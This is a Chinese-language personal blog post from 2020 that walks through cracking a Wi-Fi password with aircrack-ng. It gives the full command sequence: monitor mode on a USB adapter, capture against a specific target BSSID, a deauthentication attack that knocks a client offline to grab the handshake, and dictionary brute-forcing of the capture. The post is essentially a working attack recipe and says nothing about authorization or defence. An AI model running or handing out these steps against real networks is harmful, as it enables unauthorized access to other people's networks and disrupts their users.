---
title: 用aircrack-ng破解wifi密码
author: 黄俭
date: '2020-07-02'
slug: aircrack-ng-wifi-crack
categories:
  - Computer
tags:
  - Linux
---

## 准备阶段
 - 外置USB网卡，我用的是老古董网卡，D-Link的AirPlus G DWL-G122.
 - 安装aircrack-ng。我是在CentOS 7 for RASPBERRY PI上编译安装，前期要装的包有......。
 
## 实战阶段
1. 杀死一些影响监听的进程
```shell
 # airmon-ng check kill
```

1. 将无线网卡设定为监听状态
```shell
 # airmon-ng start wlp1s0u1u4
```
执行结果截图
![图1 airmon-ng启动网卡的监听状态](http://123.56.98.124:8080/picLIB/upload/15/2020-07-02%2011-47-27%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)

1. 查看监听网卡名
```shell
 # iwconfig
```

1. 开始监听
```shell
 # airodump-ng wlp2s0mon
```

1. 选择破解目标

1. 开始抓包
```shell
 # airodump-ng wlp3s0mon --bssid FE:7C:02:54:57:AD -c 4 -w ~/wifi_hack/HR658
```

1. 进行断线攻击
```shell
 # aireplay-ng -0 10  -a FE:7C:02:54:57:AD -c EC:89:14:68:61:17  wlp3s0mon
```
1. 检查利用密码词典暴力破解
```shell
 $ aircrack-ng data-01.cap -w ./crackstation-human-only.txt
```
1. 用screen命令挂机执行
```shell
 $ screen -S wifihack aircrack-ng data-01.cap -w ./crackstation-human-only.txt
```
1. 唤回screen
```shell
 $ screen -ls
 $ screen -r wifihack #id
```
1. Mac 系统下的操作
    - 详细的参考见[这里](https://martinsjean256.wordpress.com/2018/02/12/hacking-aircrack-ng-on-mac-cracking-wi-fi-without-kali-in-parallels/)。
    - 软件的安装见[这里](https://blog.csdn.net/wank1259162/article/details/104875834), CentOS 7下的安装在这个网页中也有描述。